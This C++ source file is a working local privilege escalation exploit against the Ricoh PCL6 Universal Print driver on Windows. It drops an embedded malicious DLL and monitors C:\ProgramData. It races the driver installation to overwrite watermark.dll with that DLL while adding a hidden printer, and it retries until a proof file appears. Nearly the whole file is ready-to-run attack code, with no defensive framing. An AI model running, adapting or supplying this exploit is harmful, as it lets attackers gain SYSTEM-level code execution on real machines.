#include <stdio.h>
#include <stdlib.h>
#include <conio.h>
#include <windows.h>
#include <iostream>
#include <fstream>
#include <thread>
#include <filesystem>

#include "poisondamage.hpp"
#include "inject_me.hpp"

namespace
{
#define MAX_BUFFER  4096

    int change_counter = 0;
    const WCHAR* const BaseDirName = L"C:\\ProgramData";
    const WCHAR* TargetDllFullFilePath, * TargetDLLRelFilePath, * MaliciousLibraryFile, * PrinterName;
    DWORD dwNotifyFilter = FILE_NOTIFY_CHANGE_LAST_WRITE |
        FILE_NOTIFY_CHANGE_SIZE |
        FILE_NOTIFY_CHANGE_LAST_ACCESS |
        FILE_NOTIFY_CHANGE_CREATION;

    typedef struct _DIRECTORY_INFO {
        HANDLE      hDir;
        TCHAR       lpszDirName[MAX_PATH];
        CHAR        lpBuffer[MAX_BUFFER];
        DWORD       dwBufLength;
        OVERLAPPED  Overlapped;
    } DIRECTORY_INFO, * PDIRECTORY_INFO, * LPDIRECTORY_INFO;

    DIRECTORY_INFO  DirInfo;

    void WINAPI HandleDirectoryChange(HANDLE dwCompletionPort) {
        DWORD numBytes, cbOffset;
        LPDIRECTORY_INFO di;
        LPOVERLAPPED lpOverlapped;
        PFILE_NOTIFY_INFORMATION fni;
        WCHAR FileName[MAX_PATH];

        do {

            GetQueuedCompletionStatus(dwCompletionPort, &numBytes, (PULONG_PTR)&di, &lpOverlapped, INFINITE);

            if (di) {
                fni = (PFILE_NOTIFY_INFORMATION)di->lpBuffer;

                do {
                    cbOffset = fni->NextEntryOffset;

                    // get filename
                    size_t num_elem = fni->FileNameLength / sizeof(WCHAR);
                    if (num_elem >= sizeof(FileName) / sizeof(WCHAR)) num_elem = 0;

                    wcsncpy_s(FileName, sizeof(FileName) / sizeof(WCHAR), fni->FileName, num_elem);
                    FileName[num_elem] = '\0';
                    wprintf(L"+ Event for %s [%d]\n", FileName, change_counter);

                    if (fni->Action == FILE_ACTION_MODIFIED) {

                        if (!wcscmp(FileName, TargetDLLRelFilePath)) {

                            if (change_counter > 0)
                                change_counter--;
                            if (change_counter == 0) {
                                change_counter--;

                                if (CopyFile(MaliciousLibraryFile, TargetDllFullFilePath, FALSE))
                                    wprintf(L"+ File %s copied to %s.\n", MaliciousLibraryFile, TargetDllFullFilePath);

                                else {
                                    wchar_t buf[256];

                                    FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                                        NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
                                        buf, (sizeof(buf) / sizeof(wchar_t)), NULL);

                                    wprintf(L"+ Failed to copy file %s to %s: %s\n", MaliciousLibraryFile, TargetDllFullFilePath, buf);
                                }

                                return;
                            } // end of trigger part
                        }
                    } // eo action mod
                    fni = (PFILE_NOTIFY_INFORMATION)((LPBYTE)fni + cbOffset);

                } while (cbOffset);

                // Reissue the watch command
                ReadDirectoryChangesW(di->hDir, di->lpBuffer, MAX_BUFFER, TRUE, dwNotifyFilter, &di->dwBufLength, &di->Overlapped, NULL);
            }
        } while (di);
    }

    bool installPrinter(const std::string& p_driver)
    {
        std::cout << "[+] Installing printer" << std::endl;

        std::wstring wdriver(p_driver.begin(), p_driver.end());

        // install printer
        PRINTER_INFO_2 printerInfo = { };
        ZeroMemory(&printerInfo, sizeof(printerInfo));
        printerInfo.pPortName = (LPWSTR)L"lpt1:";
        printerInfo.pDriverName = (LPWSTR)wdriver.c_str();
        printerInfo.pPrinterName = (LPWSTR)L"Ricoh";
        printerInfo.pPrintProcessor = (LPWSTR)L"WinPrint";
        printerInfo.pDatatype = (LPWSTR)L"RAW";
        printerInfo.pComment = (LPWSTR)L"Poison Damage";
        printerInfo.pLocation = (LPWSTR)L"Shared Ricoh Printer";
        printerInfo.Attributes = PRINTER_ATTRIBUTE_RAW_ONLY | PRINTER_ATTRIBUTE_HIDDEN;
        printerInfo.AveragePPM = 9001;
        HANDLE hPrinter = AddPrinter(NULL, 2, (LPBYTE)&printerInfo);
        if (hPrinter == 0)
        {
            std::cerr << "[-] Failed to create printer: " << GetLastError() << std::endl;
            return false;
        }

        DeletePrinter(hPrinter);
        ClosePrinter(hPrinter);
        return true;
    }
}

PoisonDamage::PoisonDamage() :
    Exploit("PCL6 Driver for Universal Print")
{
}

PoisonDamage::~PoisonDamage()
{
}

bool PoisonDamage::do_exploit()
{
    HANDLE  hCompPort = NULL;                 // Handle To a Completion Port

    PrinterName = L"PCL6 Driver for Universal Print";
    TargetDllFullFilePath = L"C:\\ProgramData\\RICOH_DRV\\PCL6 Driver for Universal Print\\_common\\dlz\\watermark.dll";
    TargetDLLRelFilePath = L"RICOH_DRV\\PCL6 Driver for Universal Print\\_common\\dlz\\watermark.dll";
    MaliciousLibraryFile = L"Dll.dll";
    change_counter = 2;

    std::cout << "[+] Dropping dll to disk" << std::endl;
    std::ofstream dll_out(m_malicious_dll, std::ofstream::out | std::ofstream::binary | std::ofstream::trunc);
    for (unsigned int i = 0; i < inject_me_dll_len; i++)
    {
        dll_out << inject_me_dll[i];
    }
    dll_out.flush();
    dll_out.close();

    std::wcout << "[+] Monitoring directory " << BaseDirName << std::endl;

    // Get a handle to the directory
    DirInfo.hDir = CreateFile(BaseDirName,
        FILE_LIST_DIRECTORY,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OVERLAPPED,
        NULL);

    if (DirInfo.hDir == INVALID_HANDLE_VALUE)
    {
        wprintf(L"[-] Unable to open directory %s. GLE=%ld. Terminating...\n", BaseDirName, GetLastError());
        return false;
    }

    lstrcpy(DirInfo.lpszDirName, BaseDirName);

    if (HANDLE hFile = CreateFile(TargetDllFullFilePath,
        GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL)) {
        wprintf(L"[+] File %s created\n", TargetDllFullFilePath);
        CloseHandle(hFile);
    }
    else
        wprintf(L"[+] File %s could not be created\n", TargetDllFullFilePath);


    if ((hCompPort = CreateIoCompletionPort(DirInfo.hDir, hCompPort, (ULONG_PTR)&DirInfo, 0)) == NULL) {
        wprintf(L"[-] CreateIoCompletionPort() failed.\n");
        return false;
    }

    // Start watching
    bool loop = true;
    while (loop)
    {
        ReadDirectoryChangesW(DirInfo.hDir, DirInfo.lpBuffer, MAX_BUFFER, TRUE, dwNotifyFilter, &DirInfo.dwBufLength, &DirInfo.Overlapped, NULL);
        std::thread watch(HandleDirectoryChange, hCompPort);
        installPrinter(m_driverName);
        watch.join();
        std::cout << "[+] Sleep for 3 seconds" << std::endl;
        std::this_thread::sleep_for(std::chrono::milliseconds(3000));

        if (!std::filesystem::exists("C:\\result.txt"))
        {
            std::cout << "[-] Failed! Try the exploit again!" << std::endl;
        }
        else
        {
            std::cout << "[!] Mucho success!" << std::endl;
            loop = false;
        }
    }

    std::cout << "[+] Cleaning up dropped dll" << std::endl;
    _unlink(m_malicious_dll.c_str());
    PostQueuedCompletionStatus(hCompPort, 0, 0, NULL);
    CloseHandle(DirInfo.hDir);
    CloseHandle(hCompPort);
    return true;
}
